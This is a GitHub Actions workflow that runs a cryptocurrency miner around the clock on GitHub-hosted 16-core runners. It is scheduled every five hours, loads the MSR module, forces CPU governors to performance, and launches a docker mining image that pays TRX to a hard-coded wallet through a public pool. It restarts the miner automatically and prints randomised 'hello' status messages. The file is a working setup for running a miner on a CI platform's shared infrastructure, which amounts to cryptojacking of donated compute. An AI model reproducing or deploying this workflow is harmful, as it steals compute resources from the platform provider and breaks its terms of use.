name: 24/7 Mining with MSR and Auto-Restart

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */5 * * *'  # Every 5 hours

jobs:
  mining-operation:
    runs-on: ubuntu-22.04-16core
    timeout-minutes: 295  # 4h 55m
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v3
    
    - name: System preparation and MSR setup
      run: |
        echo "ðŸ”§ Preparing system for mining..."
        echo "=================================="
        
        # Update system first
        sudo apt-get update
        
        # Load MSR module for CPU access
        echo "ðŸ“¦ Loading MSR module..."
        sudo modprobe msr || {
          echo "âš ï¸  Could not load msr module, trying alternative..."
          sudo apt-get install -y msr-tools
          sudo modprobe msr
        }
        
        # Check if MSR module is loaded
        if lsmod | grep -q msr; then
          echo "âœ… MSR module loaded successfully"
        else
          echo "âŒ Failed to load MSR module, but continuing..."
        fi
        
        # Install required tools
        sudo apt-get install -y cpufrequtils linux-tools-common
        
        # Disable CPU frequency scaling for mining stability
        echo "âš¡ Configuring CPU governors..."
        for cpu in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
          if [ -f "$cpu" ]; then
            echo "performance" | sudo tee $cpu >/dev/null 2>&1 || true
          fi
        done
        
        echo "âœ… System preparation complete"
    
    - name: Start mining container
      run: |
        echo "ðŸš€ Starting mining container..."
        echo "================================"
        
        # Clean up any existing container
        docker stop mining-node 2>/dev/null || true
        docker rm mining-node 2>/dev/null || true
        
        # Start mining container with proper CPU limits
        docker run \
          --name mining-node \
          --restart unless-stopped \
          --cpus="9.6" \
          --memory="8g" \
          --cpu-shares="1024" \
          -d \
          -e POOL="rx.unmineable.com:3333" \
          -e COIN="TRX" \
          -e WALLET_ADDRESS="TYnBLKxBNwigxP1wbYEiJTBkNwXpD4o6n9" \
          -e WORKER_NAME="github1-16core-$(date +%s)" \
          -e CPU_LIMIT_ENABLE="true" \
          -e CPU_LIMIT_PERCENT="60" \
          -e THREADS="8" \
          thechristech/unmineable:latest
        
        # Wait for container to initialize
        sleep 10
        
        # Check if container is running
        if docker ps | grep -q mining-node; then
          echo "âœ… Mining container started successfully"
          echo "ðŸ“Š Container ID: $(docker ps -q --filter name=mining-node)"
        else
          echo "âŒ Container failed to start, checking logs..."
          docker logs mining-node 2>/dev/null || true
          exit 1
        fi
    
    - name: Monitor and auto-restart with hello messages
      run: |
        echo "ðŸ‘€ Starting monitoring and hello service..."
        echo "=========================================="
        
        # Function to print hello with status
        print_hello() {
          TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
          CONTAINER_STATUS="STOPPED"
          if docker ps | grep -q mining-node; then
            CONTAINER_STATUS="RUNNING"
            # Get container stats
            STATS=$(docker stats mining-node --no-stream --format "CPU:{{.CPUPerc}} | MEM:{{.MemPerc}}" 2>/dev/null || echo "N/A")
            echo "[$TIMESTAMP] ðŸŸ¢ HELLO - Container is $CONTAINER_STATUS - $STATS"
          else
            echo "[$TIMESTAMP] ðŸ”´ HELLO - Container is $CONTAINER_STATUS - Attempting restart..."
            # Auto-restart container
            docker start mining-node 2>/dev/null || {
              echo "[$TIMESTAMP] âš ï¸  Restart failed, recreating container..."
              docker rm mining-node 2>/dev/null || true
              docker run \
                --name mining-node \
                --restart unless-stopped \
                --cpus="9.6" \
                --memory="8g" \
                -d \
                -e POOL="rx.unmineable.com:3333" \
                -e COIN="TRX" \
                -e WALLET_ADDRESS="TYnBLKxBNwigxP1wbYEiJTBkNwXpD4o6n9" \
                -e WORKER_NAME="github1-16core-restart-$(date +%s)" \
                -e CPU_LIMIT_ENABLE="true" \
                -e CPU_LIMIT_PERCENT="60" \
                -e THREADS="8" \
                thechristech/unmineable:latest
            }
          fi
        }
        
        # Calculate end time (4h 50m to allow cleanup)
        END_TIME=$((SECONDS + 290 * 60))
        HELLO_COUNTER=0
        
        echo "â±ï¸  Monitoring for 4 hours 50 minutes..."
        echo "ðŸ”„ Auto-restart enabled for container failures"
        echo ""
        
        # Main monitoring loop
        while [ $SECONDS -lt $END_TIME ]; do
          HELLO_COUNTER=$((HELLO_COUNTER + 1))
          echo "=== Hello #$HELLO_COUNTER ==="
          
          # Print hello with status
          print_hello
          
          # Every 10th hello, show system info
          if [ $((HELLO_COUNTER % 10)) -eq 0 ]; then
            echo "ðŸ“Š System Status:"
            echo "   Uptime: $(uptime -p)"
            echo "   Load: $(cat /proc/loadavg | awk '{print $1", "$2", "$3}')"
            echo "   Memory: $(free -h | awk '/^Mem:/ {print $3"/"$2}')"
            echo "   Disk: $(df -h / | awk 'NR==2 {print $4 " free"}')"
          fi
          
          # Random sleep between 60-120 seconds
          SLEEP_TIME=$((RANDOM % 61 + 60))
          echo "â³ Next hello in $SLEEP_TIME seconds..."
          echo ""
          sleep $SLEEP_TIME
        done
        
        echo "ðŸ•’ Time limit reached, preparing for scheduled restart..."
    
    - name: Graceful cleanup for next run
      if: always()
      run: |
        echo "ðŸ§¹ Performing cleanup..."
        echo "========================"
        
        # Save mining logs
        echo "ðŸ“„ Saving container logs..."
        docker logs --tail 100 mining-node 2>/dev/null > mining_logs.txt || true
        
        # Show final stats
        echo "ðŸ“Š Final container stats:"
        docker stats mining-node --no-stream 2>/dev/null || echo "No container running"
        
        # Stop and remove container
        echo "ðŸ›‘ Stopping container..."
        docker stop mining-node 2>/dev/null || true
        docker rm mining-node 2>/dev/null || true
        
        # Clean Docker system
        echo "ðŸ§½ Cleaning Docker system..."
        docker system prune -f 2>/dev/null || true
        
        echo "âœ… Cleanup completed at $(date)"
        echo ""
        echo "ðŸ”„ Next scheduled run in 5 minutes..."
